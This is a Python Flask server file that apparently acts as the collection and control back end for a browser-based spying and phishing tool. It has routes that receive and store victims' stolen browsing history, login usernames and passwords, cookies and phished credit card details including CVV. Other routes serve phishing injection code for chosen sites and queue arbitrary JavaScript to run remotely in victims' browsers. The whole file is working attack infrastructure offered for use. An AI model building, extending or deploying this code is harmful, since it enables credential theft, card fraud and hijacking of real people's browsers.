
from flask import Flask, render_template, request, redirect, url_for, jsonify

# Initial Database Dos
import general_db

from pyfiles import users, login, secure, history, cookies, victim, phish

app = Flask(__name__)

executeQueue = {} # Faster than DB

@app.route("/")
def index():
    usrs = users.get_all_users()
    login_kws = login.get_login_kw()
    return render_template("index.html", users = usrs, login_kws = login_kws )

@app.route('/online_check', methods=['POST'])
def online_check(): 
    if request.method == 'POST':
        email = request.form['email']
        users.update_user(email)
        return "Pinged server!"

@app.route("/view_user/<email>", methods=['GET'])
def view_user(email):
    hist = history.get_history_by_user(email)
    cook = cookies.get_cookies_by_user(email)
    logs = login.get_logins_by_user(email)
    secure_urls = secure.getFromSecure(email)
    random_urls = secure.getFromRandom(email)
    victim_urls = victim.getFromVictim(email)
    phish_urls = phish.get_phish_by_user(email)

    return render_template('user.html', email=email, history=hist, cookies=cook, logins=logs, secure_urls = secure_urls, random_urls = random_urls, phish_urls = phish_urls, victim_urls=victim_urls)

########### SECURE ###########
@app.route('/addSecure/<email>', methods=['POST'])
def add_secure(email):
    if request.method == 'POST':
        url = request.form['url']
        secure.addToSecure(email, url)  
        return redirect(url_for('view_user', email=email))

@app.route('/deleteSecure/<email>/<url>', methods=['POST'])
def delete_secure(email, url):
    if request.method == 'POST':
        secure.removeFromSecure(email, url)
        return redirect(url_for('view_user', email=email))

@app.route('/get_secure/<email>', methods=['GET'])
def get_secure(email):
    return jsonify(s=secure.getFromSecure(email))

########### RANDOM ###########
@app.route('/addRandom/<email>', methods=['POST'])
def add_random(email):
    if request.method == 'POST':
        url = request.form['url']
        secure.addToRandom(email, url)
        return redirect(url_for('view_user', email=email))

@app.route('/deleteRandom/<email>/<url>', methods=['POST'])
def delete_random(email, url):
    if request.method == 'POST':
        secure.removeFromRandom(email, url)
        return redirect(url_for('view_user', email=email))

@app.route('/get_random/<email>', methods=['GET'])
def get_random(email):
    return jsonify(r=secure.getFromRandom(email))

########### VICTIM ###########
@app.route('/addVictim/<email>', methods=['POST'])
def add_victim(email):
    if request.method == 'POST':
        url = request.form['victim_url']
        script = request.form['execute-script']
        victim.addToVictim(email, script, url)
        return redirect(url_for('view_user', email=email))

@app.route('/deleteVictim/<email>/<url>', methods=['POST'])
def delete_victim(email, url):
    if request.method == 'POST':
        victim.removeFromVictim(email, url)
        return redirect(url_for('view_user', email=email))

@app.route('/get_victim/<email>', methods=['GET'])
def get_victim(email):
    return jsonify(r=victim.getFromVictim(email))


########## History #########
@app.route("/steal_history", methods=['POST'])
def steal_history():
    email = request.form['email']
    if email=="no_email_found":
        email = request.remote_addr
    urls = request.form.getlist('urls[]')
    last_visited = request.form.getlist('last_visits[]')
    history.bulk_add_to_history(email, urls, last_visited)
    return "History Stolen"

######### Login ###########
@app.route("/steal_login", methods=['POST'])
def steal_login():
    if request.method == 'POST':
        email = request.form['email']
        if email=="no_email_found":
            email = request.remote_addr
        url = request.form['url']
        username = request.form['username']
        password = request.form['password']
        login.add_to_login(email, url, username, password)
        return "Login stolen"

@app.route("/login_kw/add", methods=['POST'])
def add_to_login_kw():
    if request.method == 'POST':
        word = request.form["word"]
        if len(word) != 0:
            login.add_login_kw(word)
        return redirect(url_for('index'))

@app.route("/login_kw/delete/<word>", methods=['POST'])
def remove_login_kw(word):
    if request.method == 'POST':
        login.delete_login_kw(word)
        return redirect(url_for('index'))

@app.route("/get_login_kw", methods=['GET'])
def get_all_login_kws():
    if request.method == 'GET':
        kws = login.get_login_kw()
        return jsonify(keywords = kws)

######## Cookies #############
@app.route("/steal_cookies", methods=['POST'])
def steal_cookies():
    if request.method == 'POST':
        email = request.form['email']
        if email=="no_email_found":
            email = request.remote_addr
        url = request.form['url']
        cookie = request.form['cookies']
        cookies.bulk_add_to_cookies(email, url, cookie)
        return "Cookies stolen"

######## Phishing ##########
@app.route("/phish/<email>", methods=['GET', 'POST'])
def phishy(email): 
    if request.method == 'GET': 
        return jsonify(urls=phish.get_phish_urls(email))

@app.route("/phish/<email>/<url>")
def phish_code(email, url):
    if request.method == 'GET':
        return jsonify(code=phish.get_phish_code(email, url))

@app.route("/phish", methods=['POST'])
def phishy_info():
    if request.method == 'POST':
        email = request.form['email']
        name = request.form['name-on-card']
        number = request.form['card-number']
        month = request.form['expiration-month']
        year = request.form['expiration-year']
        cvv = request.form['cvv']
        phish.add_phish(email, name, number, month, year, cvv)
        redirect_url = request.form['redirect-url']
        return redirect(redirect_url)

@app.route("/delete_phish/<email>/<url>", methods=['POST'])
def delete_phish(email, url):
    if request.method == 'POST':
        phish.remove_phish_url(email, url)
        return redirect(url_for('view_user', email=email))

@app.route("/add_phish/<email>", methods=['POST'])
def add_phish(email):
    if request.method == 'POST':
        url = request.form['url']
        injectLoc = request.form['inject-loc']
        injectClass = request.form['inject-class']
        phish.add_phish_url(email, url, injectLoc, injectClass)
        return redirect(url_for('view_user', email=email))

@app.route("/execute_script/<email>", methods=['GET', 'POST'])
def execute_script(email):
    if request.method == 'POST':
        script = request.form['script']
        oldList = executeQueue.get(str(email), [])
        oldList.append(str(script))
        executeQueue[str(email)] = oldList
        return redirect(url_for('index'))
    elif request.method == 'GET':
        #print "EMAIL:", str(email)
        #print "EXECUTE:", executeQueue
        script = executeQueue.get(str(email), [])
        #print "SCRIPTS:", script
        if script:
            #print "IN SCRIPT"
            executeQueue[str(email)] = []
            #print executeQueue
            #print script
            return jsonify(js=script)
        else:
            #print "NOT IN SCRIPT"
            return jsonify(js=[])

if __name__ == "__main__":
    # So template reloads when data is changed
    app.config['TEMPLATES_AUTO_RELOAD'] = True

    # uncomment this if you want to erase all tables
    general_db.drop_all_tables()

    # uncomment this if you want to create all tables
    general_db.create_all_tables()

    # uncomment this time if you want to erase the data
    # general_db.delete_db()

    # uncomment this if you want to add default values 
    general_db.insert_default_values()

    app.run(host='0.0.0.0', port=5000, debug=True)
